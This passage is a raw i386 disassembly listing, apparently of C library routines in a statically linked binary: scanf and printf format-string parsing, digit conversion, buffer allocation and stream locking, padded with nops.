mov dword [edx], eax
jmp 0x807407a
mov ecx, dword [var_dch_2]
mov edx, dword [var_e0h_2]
mov eax, dword [ecx]
mov byte [edx + eax - 1], 0
jmp 0x80701d4
movzx eax, byte [var_9ch_2]
dec dword [var_98h_2]
mov dword [var_4h], eax
mov eax, dword [var_4h]
mov dword [esp], eax
call fcn.0804e190
jmp 0x8070814
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x8073f43
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x8073f30
call fcn.08048b20
mov edx, dword [var_b4h_2]
mov dword [eax], edx
mov eax, 0xffffffff
jmp 0x8073f49
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8073ebc
add eax, 4
dec edx
jne 0x8074145
jmp 0x8073ebc
mov eax, dword [var_fch_2]
test eax, eax
jne 0x807416e
mov eax, dword [var_8ch_2]
add dword [var_8ch_2], 4
mov eax, dword [eax]
jmp 0x8073ef0
mov edx, dword [var_fch_2]
mov eax, dword [var_sp_ch]
dec edx
je 0x8074167
add eax, 4
dec edx
jne 0x807417a
jmp 0x8074167
mov dword [var_bch_2], 0xa
jmp 0x8073e42
mov dword [var_bch], 0x10
jmp 0x8073e42
call fcn.08048b20
cmp dword [eax], 4
jne 0x806fafc
jmp 0x806f8c6
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x806faef
mov dword [esp], edx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x806fadc
call fcn.08048b20
mov ecx, dword [var_b4h]
mov dword [eax], ecx
jmp 0x80741a0
or dword [var_a4h_2], 0x200
inc edx
mov dword [var_90h_2], edx
movzx ebx, byte [edx]
jmp 0x806fa64
mov edx, dword [var_90h_2]
movzx ebx, byte [edx]
cmp bl, 0x73
je 0x807421b
cmp bl, 0x53
je 0x807421b
cmp bl, 0x5b
je 0x807421b
dec edx
jmp 0x80741f2
or dword [var_a4h_2], 0x100
jmp 0x806fa64
or dword [var_a4h_2], 2
mov ecx, dword [var_90h_2]
movzx ebx, byte [ecx]
jmp 0x806fa64
mov ecx, dword [var_90h_2]
movzx ebx, byte [ecx]
cmp bl, 0x6c
je 0x8074259
or dword [var_a4h_2], 1
jmp 0x806fa64
or dword [var_a4h_2], 3
inc ecx
mov dword [var_90h_2], ecx
jmp 0x8074237
or dword [var_a4h_2], 3
mov eax, dword [var_90h]
movzx ebx, byte [eax]
jmp 0x806fa64
dec dword [var_90h]
jmp 0x8074270
mov edx, dword [var_90h_2]
jmp 0x80741f8
inc dword [var_90h_2]
mov ecx, dword [var_90h_2]
movzx ebx, byte [ecx]
cmp bl, 0x2a
je 0x807431c
cmp bl, 0x27
je 0x807431c
cmp bl, 0x49
je 0x807431c
movzx eax, bl
mov ecx, dword [var_a4h]
mov dword [var_a0h], 0
sub eax, 0x30
cmp eax, 9
setbe dl
or ecx, 0x40
and edx, 1
cmove ecx, dword [var_a4h]
cmp eax, 9
mov dword [var_a4h], ecx
ja 0x806fa25
mov ecx, dword [var_a0h_2]
movzx eax, bl
inc dword [var_90h_2]
lea edx, [ecx + ecx*4]
lea edx, [eax + edx*2 - 0x30]
mov eax, dword [var_90h_2]
mov dword [var_a0h_2], edx
movzx ebx, byte [eax]
movzx eax, bl
sub eax, 0x30
cmp eax, 9
jbe 0x80742e7
jmp 0x806fa1b
movsx eax, bl
inc dword [var_90h]
cmp eax, 0x2a
je 0x807436b
jg 0x807435a
cmp eax, 0x27
je 0x807434e
mov edx, dword [var_90h]
movzx ebx, byte [edx]
cmp bl, 0x2a
je 0x807431c
cmp bl, 0x27
je 0x807431c
cmp bl, 0x49
je 0x807431c
jmp 0x80742af
or dword [var_a4h_2], 0x80
jmp 0x8074331
cmp eax, 0x49
jne 0x8074331
or dword [var_a4h_2], 0x400
jmp 0x8074331
or dword [var_a4h], 8
jmp 0x8074331
mov edx, dword [var_90h]
mov dword [esp], edx
call fcn.08053400
lea ecx, [var_64h]
mov dword [var_4h], eax
mov dword [var_8h], ecx
mov eax, dword [var_90h]
mov dword [esp], eax
call fcn.080778c0
test eax, eax
mov ebx, eax
jle 0x8074454
cmp dword [var_9ch_2], 0xffffffff
je 0x8074440
mov ecx, dword [var_4h]
mov eax, dword [ecx + 4]
cmp eax, dword [ecx + 8]
jae 0x8074430
movzx edx, byte [eax]
mov ecx, dword [var_4h]
inc eax
mov dword [ecx + 4], eax
mov dword [var_9ch_2], edx
cmp dword [var_9ch_2], 0xffffffff
je 0x8074421
inc dword [var_98h_2]
mov edx, dword [var_9ch_2]
cmp edx, 0xffffffff
mov dword [var_9ch_2], edx
je 0x806f8c6
mov ecx, dword [var_90h_2]
movzx eax, byte [ecx]
inc ecx
mov dword [var_90h_2], ecx
cmp edx, eax
jne 0x807440f
dec ebx
test ebx, ebx
jg 0x80743a5
jmp 0x806f69c
movzx eax, dl
mov edx, dword [var_4h]
mov dword [var_4h], eax
mov dword [esp], edx
jmp 0x806f8b2
call fcn.08048b20
mov eax, dword [eax]
mov dword [var_b4h_2], eax
jmp 0x80743dc
mov dword [esp], ecx
call fcn.0804da90
mov dword [var_9ch_2], eax
jmp 0x80743cd
call fcn.08048b20
mov edx, dword [var_b4h_2]
mov dword [eax], edx
mov edx, 0xffffffff
jmp 0x80743e2
mov eax, dword [var_90h]
movzx ebx, byte [eax]
jmp 0x806f66c
mov dword [esp], eax
call fcn.08074540
jmp 0x806f648
mov ecx, dword [arg_8h]
lea eax, [var_1ch]
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
mov dword [var_8h], ecx
call section.
jmp 0x806f63b
call fcn.08048b20
mov dword [eax], 0x16
mov eax, 0xffffffff
jmp 0x806f74c
call fcn.08048b20
mov dword [eax], 9
jmp 0x8074499
mov edx, dword [0x80a9ab4]
mov dword [var_ach], edx
jmp 0x806f55c
mov dword [var_sp_ch], str._IO_vfscanf
mov dword [var_8h], 0x7fe
mov dword [var_4h], str.vfscanf.c
mov dword [esp], str.cnt______uint32_t_______locale_t_____pthread_internal_tsd_get_____void__0______pthread_internal_tsd_get___LIBC_TSD_KEY_LOCALE__:___libc_tsd_LOCALE_data______locales___LC_CTYPE____values___int____NL_CTYPE_MB_CUR_MAX___0xffff__.word__
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [var_sp_ch]
mov dword [esp + 0xc], 0
mov dword [var_8h_4], eax
mov eax, dword [var_8h]
mov dword [var_4h_4], eax
mov eax, dword [var_4h]
mov dword [esp], eax
call fcn.0806f500
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
test eax, eax
mov edx, dword [arg_8h]
je 0x807455b
mov eax, dword [edx + 0x48]
mov dword [arg_8h], eax
leave
jmp section.
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov eax, 0
mov ebp, esp
test eax, eax
mov edx, dword [arg_8h]
je 0x807459b
mov eax, dword [edx + 0x48]
mov dword [arg_8h], eax
leave
jmp section.
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx]
movzx eax, byte [edx]
lea ecx, [eax - 0x30]
lea eax, [edx + 1]
mov dword [ebx], eax
movzx eax, byte [edx + 1]
sub eax, 0x30
cmp eax, 9
ja 0x80745fd
mov edx, dword [ebx]
lea ecx, [ecx + ecx*4]
movzx eax, byte [edx]
lea ecx, [eax + ecx*2 - 0x30]
lea eax, [edx + 1]
mov dword [ebx], eax
movzx eax, byte [edx + 1]
sub eax, 0x30
cmp eax, 9
jbe 0x80745e0
pop ebx
mov eax, ecx
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0xc
mov esi, dword [arg_ch]
mov ebx, dword [arg_8h]
movzx eax, byte [ebx]
test al, al
je 0x8074676
cmp al, 0x25
je 0x8074676
lea esi, [esi]
mov dword [esi], 0
test byte [ebx], 0x80
je 0x8074680
mov eax, 0
test eax, eax
je 0x8074683
mov dword [esp], 3
call section.
mov eax, dword [eax]
mov dword [var_8h], esi
mov eax, dword [eax + 0x58]
mov dword [esp], ebx
mov dword [var_4h], eax
call fcn.080778c0
test eax, eax
jle 0x8074680
add ebx, eax
movzx eax, byte [ebx]
test al, al
je 0x8074676
cmp al, 0x25
jne 0x8074630
add esp, 0xc
mov eax, ebx
pop ebx
pop esi
leave
ret
nop
inc ebx
jmp 0x807466b
mov eax, dword [0x80a9ab4]
jmp 0x8074650
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov edx, dword [arg_8h]
mov dword [var_10h], 0
mov ebx, dword [arg_10h]
mov edi, dword [arg_ch]
lea esi, [edx + 1]
movzx eax, byte [ebx + 0xd]
mov dword [arg_8h], esi
mov dword [ebx + 0x24], 0xffffffff
and byte [ebx + 0xc], 7
mov dword [ebx + 0x10], 0x20
mov ecx, esi
and eax, 0xfffffff2
mov byte [ebx + 0xd], al
movzx eax, byte [edx + 1]
sub eax, 0x30
cmp eax, 9
jbe 0x8074a79
lea esi, [esi]
movzx eax, byte [ecx]
sub eax, 0x20
cmp eax, 0x29
ja case.0x80746eb.33
jmp dword [eax*4 + 0x80a269c]
or byte [ebx + 0xc], 0x10
mov eax, ecx
inc ecx
mov dword [arg_8h], ecx
cmp byte [eax + 1], 0
jne 0x80746e0
test byte [ebx + 0xc], 0x20
je 0x807470f
mov dword [ebx + 0x10], 0x20
mov dword [ebx + 0x20], 0xffffffff
mov dword [ebx + 4], 0
mov edx, ecx
movzx eax, byte [ecx]
cmp al, 0x2a
je 0x80749db
movzx eax, al
sub eax, 0x30
cmp eax, 9
jbe 0x80749c5
mov dword [ebx + 0x1c], 0xffffffff
mov dword [ebx], 0xffffffff
mov edx, ecx
cmp byte [ecx], 0x2e
je 0x807492c
and byte [ebx + 0xc], 0xf8
and byte [ebx + 0xd], 0xfd
movzx eax, byte [ecx]
inc ecx
mov dword [arg_8h], ecx
sub eax, 0x4c
cmp eax, 0x2e
ja case.0x807476c.77
jmp dword [eax*4 + 0x80a2744]
mov ecx, dword [arg_8h]
cmp byte [ecx], 0x68
je 0x80748e7
or byte [ebx + 0xc], 2
movzx edx, byte [ecx]
lea eax, [ecx + 1]
mov ecx, dword [0x80aad28]
mov dword [arg_8h], eax
test ecx, ecx
mov dword [ebx + 8], edx
jne 0x80748aa
mov ecx, dword [ebx + 8]
mov dword [ebx + 0x2c], 1
lea eax, [ecx - 0x41]
cmp eax, 0x37
ja case.0x80747b3.66
jmp dword [eax*4 + 0x80a2800]
movzx eax, byte [ebx + 0xc]
test al, 1
je 0x8074818
mov dword [ebx + 0x28], 0x100
lea esi, [esi]
cmp dword [ebx + 0x24], 0xffffffff
je 0x8074809
test ecx, ecx
jne 0x80747ef
mov eax, dword [arg_8h]
dec eax
mov dword [ebx + 0x18], eax
mov dword [ebx + 0x14], eax
mov eax, dword [var_10h]
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_8h]
mov edx, dword [arg_18h]
mov dword [ebx + 0x14], eax
mov dword [esp], eax
mov dword [var_4h], edx
call fcn.08074610
mov dword [ebx + 0x18], eax
jmp 0x80747e4
mov eax, dword [ebx + 0x2c]
test eax, eax
je 0x80747d6
mov dword [ebx + 0x24], edi
add dword [var_10h], eax
jmp 0x80747d6
test al, 4
je 0x8074825
mov dword [ebx + 0x28], 0x200
jmp 0x80747d0
test al, 2
je 0x8074832
mov dword [ebx + 0x28], 0x400
jmp 0x80747d0
xor eax, eax
test byte [ebx + 0xd], 2
setne al
mov dword [ebx + 0x28], eax
jmp 0x80747d0
mov dword [ebx + 0x28], 2
jmp 0x80747d0
mov dword [ebx + 0x28], 4
jmp 0x80747d0
mov dword [ebx + 0x28], 1
jmp 0x80747d0
test byte [ebx + 0xc], 1
mov edx, 0x107
mov eax, 7
cmove edx, eax
mov dword [ebx + 0x28], edx
jmp 0x80747d0
mov dword [ebx + 0x28], 0x800
jmp 0x80747d0
mov dword [ebx + 0x28], 5
jmp 0x80747d0
mov dword [ebx + 0x28], 3
jmp 0x80747d0
mov dword [ebx + 0x2c], 0
jmp 0x80747d0
cmp edx, 0xff
jg 0x807479d
mov ecx, dword [0x80aad94]
mov eax, dword [ecx + edx*4]
test eax, eax
je 0x807479d
lea eax, [ebx + 0x28]
mov dword [var_4h], 1
mov dword [esp], ebx
mov dword [var_8h], eax
call dword [ecx + edx*4]
mov ecx, dword [ebx + 8]
mov dword [ebx + 0x2c], eax
jmp 0x80747d0
inc ecx
mov dword [arg_8h], ecx
or byte [ebx + 0xd], 2
jmp 0x8074783
or byte [ebx + 0xc], 5
mov ecx, dword [arg_8h]
jmp 0x8074783
or byte [ebx + 0xc], 4
mov ecx, dword [arg_8h]
cmp byte [ecx], 0x6c
jne 0x8074783
inc ecx
mov dword [arg_8h], ecx
or byte [ebx + 0xc], 1
jmp 0x80748f8
and byte [ebx + 0xc], 0xfa
jmp 0x80748f8
mov ecx, dword [arg_8h]
dec ecx
mov dword [arg_8h], ecx
jmp 0x8074783
inc ecx
mov dword [arg_8h], ecx
movzx eax, byte [edx + 1]
cmp al, 0x2a
je 0x8074963
movzx eax, al
sub eax, 0x30
cmp eax, 9
jbe 0x807494e
mov dword [ebx], 0
jmp 0x8074751
lea edx, [arg_8h]
mov dword [esp], edx
call fcn.080745c0
mov dword [ebx], eax
mov ecx, dword [arg_8h]
jmp 0x8074751
lea ecx, [edx + 2]
mov dword [arg_8h], ecx
mov esi, ecx
movzx eax, byte [edx + 2]
sub eax, 0x30
cmp eax, 9
jbe 0x8074991
mov eax, dword [ebx + 0x1c]
test eax, eax
jns 0x807495b
inc dword [var_10h]
mov eax, edi
mov ecx, esi
inc edi
mov dword [ebx + 0x1c], eax
mov dword [arg_8h], esi
jmp 0x8074751
lea eax, [arg_8h]
mov dword [esp], eax
call fcn.080745c0
test eax, eax
mov edx, eax
je 0x8074977
mov ecx, dword [arg_8h]
cmp byte [ecx], 0x24
jne 0x8074977
lea eax, [eax - 1]
mov dword [ebx + 0x1c], eax
mov eax, dword [arg_14h]
mov eax, dword [eax]
cmp edx, eax
cmovb edx, eax
inc ecx
mov eax, dword [arg_14h]
mov dword [arg_8h], ecx
mov dword [eax], edx
jmp 0x8074977
lea edx, [arg_8h]
mov dword [esp], edx
call fcn.080745c0
mov dword [ebx + 4], eax
mov ecx, dword [arg_8h]
jmp 0x8074739
inc ecx
mov dword [arg_8h], ecx
mov esi, ecx
movzx eax, byte [edx + 1]
sub eax, 0x30
cmp eax, 9
jbe 0x8074a0b
mov eax, dword [ebx + 0x20]
test eax, eax
jns 0x80749d3
mov eax, edi
mov ecx, esi
mov dword [var_10h], 1
inc edi
mov dword [ebx + 0x20], eax
mov dword [arg_8h], esi
jmp 0x8074739
lea eax, [arg_8h]
mov dword [esp], eax
call fcn.080745c0
test eax, eax
mov edx, eax
je 0x80749ed
mov ecx, dword [arg_8h]
cmp byte [ecx], 0x24
jne 0x80749ed
lea eax, [eax - 1]
mov dword [ebx + 0x20], eax
mov eax, dword [arg_14h]
mov eax, dword [eax]
cmp edx, eax
cmovb edx, eax
inc ecx
mov eax, dword [arg_14h]
mov dword [arg_8h], ecx
mov dword [eax], edx
jmp 0x80749ed
nop
or byte [ebx + 0xc], 8
jmp 0x80746f6
or byte [ebx + 0xc], 0x80
jmp 0x80746f6
or byte [ebx + 0xc], 0x40
jmp 0x80746f6
or byte [ebx + 0xc], 0x20
jmp 0x80746f6
mov dword [ebx + 0x10], 0x30
jmp 0x80746f6
or byte [ebx + 0xd], 8
jmp 0x80746f6
lea eax, [arg_8h]
mov dword [esp], eax
call fcn.080745c0
test eax, eax
mov edx, eax
je 0x8074a92
mov eax, dword [arg_8h]
cmp byte [eax], 0x24
je 0x8074a9c
mov ecx, esi
mov dword [arg_8h], esi
jmp 0x80746e0
mov esi, dword [arg_14h]
lea ecx, [eax + 1]
lea eax, [edx - 1]
mov dword [ebx + 0x24], eax
mov dword [arg_8h], ecx
mov eax, dword [esi]
cmp edx, eax
cmovae eax, edx
mov dword [esi], eax
jmp 0x80746e0
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx]
mov ecx, dword [eax]
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [ebx], edx
sub eax, 0x30
sub ecx, 0x30
cmp eax, 9
ja 0x8074afb
mov esi, esi
mov edx, dword [ebx]
lea ecx, [ecx + ecx*4]
mov eax, dword [edx]
lea ecx, [eax + ecx*2 - 0x30]
lea eax, [edx + 4]
mov dword [ebx], eax
mov eax, dword [edx + 4]
sub eax, 0x30
cmp eax, 9
jbe 0x8074ae0
pop ebx
mov eax, ecx
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, dword [arg_8h]
mov dword [var_4h], 0x25
mov dword [esp], eax
call fcn.080783f0
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov eax, dword [arg_8h]
mov dword [var_10h], 0
mov ebx, dword [arg_10h]
mov edi, dword [arg_ch]
lea esi, [eax + 4]
movzx edx, byte [ebx + 0xd]
mov dword [arg_8h], esi
mov dword [ebx + 0x24], 0xffffffff
and byte [ebx + 0xc], 7
mov ecx, esi
mov dword [ebx + 0x10], 0x20
and edx, 0xfffffff6
or edx, 4
mov byte [ebx + 0xd], dl
mov eax, dword [eax + 4]
sub eax, 0x30
cmp eax, 9
jbe 0x8074f0b
nop
mov eax, dword [ecx]
sub eax, 0x20
cmp eax, 0x29
ja case.0x8074b7a.33
jmp dword [eax*4 + 0x80a28e0]
or byte [ebx + 0xc], 0x10
mov eax, ecx
add ecx, 4
mov eax, dword [eax + 4]
mov dword [arg_8h], ecx
test eax, eax
jne 0x8074b70
test byte [ebx + 0xc], 0x20
je 0x8074ba1
mov dword [ebx + 0x10], 0x20
mov dword [ebx + 0x20], 0xffffffff
mov dword [ebx + 4], 0
mov edx, ecx
mov eax, dword [ecx]
cmp eax, 0x2a
je 0x8074e6b
sub eax, 0x30
cmp eax, 9
jbe 0x8074e55
mov dword [ebx + 0x1c], 0xffffffff
mov dword [ebx], 0xffffffff
mov edx, ecx
cmp dword [ecx], 0x2e
je 0x8074dbc
and byte [ebx + 0xc], 0xf8
and byte [ebx + 0xd], 0xfd
mov eax, dword [ecx]
add ecx, 4
mov dword [arg_8h], ecx
sub eax, 0x4c
cmp eax, 0x2e
ja case.0x8074bfc.77
jmp dword [eax*4 + 0x80a2988]
mov ecx, dword [arg_8h]
cmp dword [ecx], 0x68
je 0x8074d71
or byte [ebx + 0xc], 2
lea eax, [ecx + 4]
mov edx, dword [ecx]
mov ecx, dword [0x80aad28]
mov dword [arg_8h], eax
test ecx, ecx
mov dword [ebx + 8], edx
jne 0x8074d34
mov ecx, dword [ebx + 8]
mov dword [ebx + 0x2c], 1
lea eax, [ecx - 0x41]
cmp eax, 0x37
ja case.0x8074c42.66
jmp dword [eax*4 + 0x80a2a44]
movzx eax, byte [ebx + 0xc]
test al, 1
je 0x8074ca2
mov dword [ebx + 0x28], 0x100
cmp dword [ebx + 0x24], 0xffffffff
je 0x8074c93
test ecx, ecx
jne 0x8074c80
mov eax, dword [arg_8h]
sub eax, 4
mov dword [ebx + 0x18], eax
mov dword [ebx + 0x14], eax
mov eax, dword [var_10h]
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
lea esi, [esi]
mov eax, dword [arg_8h]
mov dword [ebx + 0x14], eax
mov dword [esp], eax
call fcn.08074b00
mov dword [ebx + 0x18], eax
jmp 0x8074c6e
mov eax, dword [ebx + 0x2c]
test eax, eax
je 0x8074c5e
mov dword [ebx + 0x24], edi
add dword [var_10h], eax
jmp 0x8074c5e
test al, 4
je 0x8074caf
mov dword [ebx + 0x28], 0x200
jmp 0x8074c58
test al, 2
je 0x8074cbc
mov dword [ebx + 0x28], 0x400
jmp 0x8074c58
xor eax, eax
test byte [ebx + 0xd], 2
setne al
mov dword [ebx + 0x28], eax
jmp 0x8074c58
mov dword [ebx + 0x28], 2
jmp 0x8074c58
mov dword [ebx + 0x28], 4
jmp 0x8074c58
mov dword [ebx + 0x28], 1
jmp 0x8074c58
test byte [ebx + 0xc], 1
mov edx, 0x107
mov eax, 7
cmove edx, eax
mov dword [ebx + 0x28], edx
jmp 0x8074c58
mov dword [ebx + 0x28], 0x800
jmp 0x8074c58
mov dword [ebx + 0x28], 5
jmp 0x8074c58
mov dword [ebx + 0x28], 3
jmp 0x8074c58
mov dword [ebx + 0x2c], 0
jmp 0x8074c58
cmp edx, 0xff
jg 0x8074c2c
mov ecx, dword [0x80aad94]
mov eax, dword [ecx + edx*4]
test eax, eax
je 0x8074c2c
lea eax, [ebx + 0x28]
mov dword [var_4h], 1
mov dword [esp], ebx
mov dword [var_8h], eax
call dword [ecx + edx*4]
mov ecx, dword [ebx + 8]
mov dword [ebx + 0x2c], eax
jmp 0x8074c58
add ecx, 4
mov dword [arg_8h], ecx
or byte [ebx + 0xd], 2
jmp 0x8074c13
or byte [ebx + 0xc], 5
mov ecx, dword [arg_8h]
jmp 0x8074c13
or byte [ebx + 0xc], 4
mov ecx, dword [arg_8h]
cmp dword [ecx], 0x6c
jne 0x8074c13
add ecx, 4
mov dword [arg_8h], ecx
or byte [ebx + 0xc], 1
jmp 0x8074d84
and byte [ebx + 0xc], 0xfa
jmp 0x8074d84
mov ecx, dword [arg_8h]
sub ecx, 4
mov dword [arg_8h], ecx
jmp 0x8074c13
mov eax, dword [edx + 4]
add ecx, 4
mov dword [arg_8h], ecx
cmp eax, 0x2a
je 0x8074df2
sub eax, 0x30
cmp eax, 9
jbe 0x8074ddd
mov dword [ebx], 0
jmp 0x8074be0
lea edx, [arg_8h]
mov dword [esp], edx
call fcn.08074ac0
mov dword [ebx], eax
mov ecx, dword [arg_8h]
jmp 0x8074be0
mov eax, dword [edx + 8]
lea ecx, [edx + 8]
mov dword [arg_8h], ecx
mov esi, ecx
sub eax, 0x30
cmp eax, 9
jbe 0x8074e1f
mov eax, dword [ebx + 0x1c]
test eax, eax
jns 0x8074dea
inc dword [var_10h]
mov eax, edi
mov ecx, esi
inc edi
mov dword [ebx + 0x1c], eax
mov dword [arg_8h], esi
jmp 0x8074be0
lea eax, [arg_8h]
mov dword [esp], eax
call fcn.08074ac0
test eax, eax
mov edx, eax
je 0x8074e05
mov ecx, dword [arg_8h]
cmp dword [ecx], 0x24
jne 0x8074e05
lea eax, [eax - 1]
mov dword [ebx + 0x1c], eax
mov eax, dword [arg_14h]
mov eax, dword [eax]
cmp edx, eax
cmovb edx, eax
add ecx, 4
mov eax, dword [arg_14h]
mov dword [arg_8h], ecx
mov dword [eax], edx
jmp 0x8074e05
lea edx, [arg_8h]
mov dword [esp], edx
call fcn.08074ac0
mov dword [ebx + 4], eax
mov ecx, dword [arg_8h]
jmp 0x8074bc8
mov eax, dword [edx + 4]
add ecx, 4
mov dword [arg_8h], ecx
mov esi, ecx
sub eax, 0x30
cmp eax, 9
jbe 0x8074e9c
mov eax, dword [ebx + 0x20]
test eax, eax
jns 0x8074e63
mov eax, edi
mov ecx, esi
mov dword [var_10h], 1
inc edi
mov dword [ebx + 0x20], eax
mov dword [arg_8h], esi
jmp 0x8074bc8
lea eax, [arg_8h]
mov dword [esp], eax
call fcn.08074ac0
test eax, eax
mov edx, eax
je 0x8074e7e
mov ecx, dword [arg_8h]
cmp dword [ecx], 0x24
jne 0x8074e7e
lea eax, [eax - 1]
mov dword [ebx + 0x20], eax
mov eax, dword [arg_14h]
mov eax, dword [eax]
cmp edx, eax
cmovb edx, eax
add ecx, 4
mov eax, dword [arg_14h]
mov dword [arg_8h], ecx
mov dword [eax], edx
jmp 0x8074e7e
or byte [ebx + 0xc], 8
jmp 0x8074b85
or byte [ebx + 0xc], 0x80
jmp 0x8074b85
or byte [ebx + 0xc], 0x40
jmp 0x8074b85
or byte [ebx + 0xc], 0x20
jmp 0x8074b85
mov dword [ebx + 0x10], 0x30
jmp 0x8074b85
or byte [ebx + 0xd], 8
jmp 0x8074b85
lea eax, [arg_8h]
mov dword [esp], eax
call fcn.08074ac0
test eax, eax
mov edx, eax
je 0x8074f24
mov eax, dword [arg_8h]
cmp dword [eax], 0x24
je 0x8074f2e
mov ecx, esi
mov dword [arg_8h], esi
jmp 0x8074b70
mov esi, dword [arg_14h]
lea ecx, [eax + 4]
lea eax, [edx - 1]
mov dword [ebx + 0x24], eax
mov dword [arg_8h], ecx
mov eax, dword [esi]
cmp edx, eax
cmovae eax, edx
mov dword [esi], eax
jmp 0x8074b70
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push esi
mov esi, 0x2000
push ebx
sub esp, 0x78
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x38]
test eax, eax
js 0x8074fc5
mov eax, dword [ebx + 0x94]
lea edx, [var_68h]
mov dword [esp], ebx
mov dword [var_4h], edx
call dword [eax + 0x48]
test eax, eax
js 0x8074fc5
mov eax, dword [var_58h]
and eax, 0xf000
cmp eax, 0x2000
je 0x8075033
mov eax, dword [var_34h]
test eax, eax
cmovg esi, eax
lea eax, [esi + 0xfff]
mov dword [var_14h], 0
mov dword [var_10h], 0xffffffff
and eax, 0xfffff000
mov dword [var_ch], 0x22
mov dword [var_8h], 3
mov dword [var_4h], eax
mov dword [esp], 0
call fcn.080546d0
mov edx, eax
mov eax, 0xffffffff
cmp edx, 0xffffffff
je 0x807502c
lea eax, [esi + edx]
mov dword [var_ch], 1
mov dword [var_4h], edx
mov dword [var_8h], eax
mov dword [esp], ebx
call fcn.0804db40
mov eax, 1
add esp, 0x78
pop ebx
pop esi
leave
ret
mov edx, dword [var_44h]
mov eax, dword [var_48h]
shrd eax, edx, 8
shr edx, 8
mov ecx, eax
shrd eax, edx, 0x18
and ecx, 0xfff
and eax, 0xfffff000
or ecx, eax
sub ecx, 0x88
cmp ecx, 7
ja 0x8075069
or dword [ebx], 0x200
jmp 0x8074fbd
mov eax, dword [ebx + 0x38]
mov dword [esp], eax
call fcn.08079ee0
test eax, eax
je 0x8074fbd
jmp 0x807505e
nop
nop
push ebp
mov ebp, esp
sub esp, 0x28
mov dword [var_8h], esi
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov esi, dword [arg_8h]
test esi, esi
je 0x8075129
movzx edx, word [esi]
xor edi, edi
test dx, dx
js 0x80750d0
mov eax, 0
test eax, eax
je 0x80750d0
lea eax, [var_1ch]
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], fcn.08074580
mov dword [esp], eax
mov edi, 1
call section.
movzx edx, word [esi]
lea esi, [esi]
test dx, dx
jns 0x807511f
mov eax, dword [esi + 0x94]
xor ebx, ebx
mov dword [esp], esi
call dword [eax + 0x30]
test eax, eax
sete bl
dec ebx
cmp word [esi], 0
jns 0x8075115
test edi, edi
jne 0x8075100
mov eax, ebx
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea eax, [var_1ch]
mov dword [var_sp_4h], 0
mov dword [esp], eax
call section.
jmp 0x80750f3
mov dword [esp], esi
call fcn.08074580
jmp 0x80750ef
mov dword [esp], esi
call fcn.08074540
jmp 0x80750d5
call fcn.0804e3b0
jmp 0x80750f5
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
mov esi, 0xffffffff
push ebx
sub esp, 0x20
mov eax, dword [arg_8h]
mov ebx, dword [arg_ch]
mov dword [esp], eax
call fcn.08053400
movzx edx, word [ebx]
mov dword [var_20h], 0
mov edi, eax
test dx, dx
js 0x8075197
mov eax, 0
test eax, eax
je 0x8075197
lea eax, [var_1ch]
mov dword [var_20h], 1
mov dword [var_8h], ebx
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
call section.
movzx edx, word [ebx]
test dx, dx
jns 0x807520b
mov eax, dword [ebx + 0x5c]
test eax, eax
jne 0x80751af
mov dword [ebx + 0x5c], 0xffffffff
mov eax, 0xffffffff
inc eax
je 0x80751e8
cmp word [ebx], 0
jns 0x80751de
mov eax, dword [var_20h]
test eax, eax
jne 0x80751c9
add esp, 0x20
mov eax, esi
pop ebx
pop esi
pop edi
leave
ret
lea eax, [var_1ch]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x80751bf
mov dword [esp], ebx
call fcn.08074580
jmp 0x80751b8
mov eax, dword [ebx + 0x94]
mov edx, dword [arg_8h]
mov dword [esp], ebx
mov dword [var_8h], edi
mov dword [var_4h], edx
call dword [eax + 0x1c]
cmp eax, edi
mov eax, 1
cmove esi, eax
jmp 0x80751b2
mov dword [esp], ebx
call fcn.08074540
jmp 0x807519c
nop
nop
nop
nop
nop
